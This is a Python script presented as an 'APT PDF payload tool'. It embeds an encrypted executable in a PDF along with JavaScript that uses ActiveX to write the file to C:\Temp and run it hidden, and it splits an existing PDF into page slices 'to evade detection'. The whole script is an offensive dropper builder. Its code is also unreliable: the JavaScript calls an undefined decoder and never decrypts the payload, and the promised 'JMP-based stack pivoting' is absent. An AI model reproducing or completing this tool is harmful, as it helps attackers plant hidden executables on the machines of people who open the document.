import os
import time
import base64
import random
import string
import subprocess
import psutil
import struct
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from io import BytesIO
from PyPDF2 import PdfWriter, PdfReader
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from rich.console import Console
from rich.table import Table
from tkinter import Tk
from tkinter.filedialog import askopenfilename

# Initialize Console
console = Console()

# Clear console
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

# Display banner
def display_banner():
    console.print("[bold magenta]Advanced APT PDF Payload Tool with JMP-Based Stack Pivoting[/bold magenta]")

# Key generation and encryption functions
def generate_asymmetric_keys():
    """Generate RSA keys for asymmetric encryption."""
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
    return private_key, private_key.public_key()

def rsa_encrypt(data, public_key):
    """RSA encrypt data."""
    return public_key.encrypt(
        data,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )

def aes_encrypt(data, key):
    """AES-256-CBC encrypt data."""
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padded_data = data + b'\0' * (16 - len(data) % 16)
    return iv + encryptor.update(padded_data) + encryptor.finalize()

def generate_key():
    """Generate AES-256 symmetric key."""
    return os.urandom(32)

# File and PDF utilities
def random_filename(extension=".exe"):
    """Generate random filename."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + extension

def slice_pdf(pdf_path):
    """Slice PDF into multiple parts to evade detection."""
    slices = []
    with open(pdf_path, "rb") as f:
        reader = PdfReader(f)
        for i in range(len(reader.pages)):
            writer = PdfWriter()
            writer.add_page(reader.pages[i])
            slice_buffer = BytesIO()
            writer.write(slice_buffer)
            slice_buffer.seek(0)
            slices.append(slice_buffer.getvalue())
    return slices

def embed_payload_in_pdf(output_pdf_path, payload, symmetric_key, slices):
    """Embed encrypted payload in PDF slices."""
    writer = PdfWriter()
    for slice_content in slices:
        writer.add_page(PdfReader(BytesIO(slice_content)).pages[0])

    js_payload = f"""
        var enc_key = "{base64.urlsafe_b64encode(symmetric_key).decode()}";
        var enc_payload = "{base64.urlsafe_b64encode(payload).decode()}";
        function executePayload() {{
            try {{
                var fso = new ActiveXObject("Scripting.FileSystemObject");
                var tempFile = "C:\\\\Temp\\\\" + "{random_filename()}";
                var file = fso.CreateTextFile(tempFile, true);
                var decrypted = decodeBase64(enc_payload);
                file.Write(decrypted);
                file.Close();

                var shell = new ActiveXObject("WScript.Shell");
                shell.Run(tempFile, 0);
            }} catch (e) {{
                console.log("Execution error: " + e.message);
            }}
        }}
        executePayload();
    """
    writer.add_js(js_payload)
    with open(output_pdf_path, "wb") as f:
        writer.write(f)
    console.print(f"[green]APT PDF payload created at {output_pdf_path}[/green]")

def select_file():
    """Prompt user to select a binary file."""
    Tk().withdraw()
    return askopenfilename(filetypes=[("Executable files", "*.exe"), ("Binary files", "*.bin"), ("All files", "*.*")])

def read_binary_file(file_path):
    """Read binary content."""
    with open(file_path, 'rb') as f:
        return f.read()

# Main Execution
def main():
    clear_console()
    display_banner()

    console.print("[bold cyan]Select binary file to embed in PDF[/bold cyan]")
    file_path = select_file()
    if not file_path:
        console.print("[red]No file selected, exiting.[/red]")
        return

    payload = read_binary_file(file_path)
    symmetric_key = generate_key()
    private_key, public_key = generate_asymmetric_keys()
    encrypted_payload = aes_encrypt(payload, symmetric_key)
    encrypted_symmetric_key = rsa_encrypt(symmetric_key, public_key)

    console.print("[bold cyan]Enter output PDF name (with .pdf extension)[/bold cyan]")
    output_pdf_path = input("> ") or "advanced_apt_payload.pdf"

    console.print("[bold cyan]Enter existing PDF path (or leave blank for new)[/bold cyan]")
    existing_pdf_path = input("> ").strip()

    pdf_slices = slice_pdf(existing_pdf_path) if existing_pdf_path else [BytesIO().getvalue()]
    embed_payload_in_pdf(output_pdf_path, encrypted_payload, symmetric_key, pdf_slices)

    table = Table(title="APT Payload Information")
    table.add_column("Detail", style="cyan")
    table.add_column("Value", style="magenta")
    table.add_row("Payload File", os.path.basename(file_path))
    table.add_row("Encrypted Payload", base64.urlsafe_b64encode(encrypted_payload).decode())
    table.add_row("Encrypted Symmetric Key", base64.urlsafe_b64encode(encrypted_symmetric_key).decode())
    table.add_row("Target PDF", output_pdf_path)

    console.print(table)

if __name__ == "__main__":
    main()
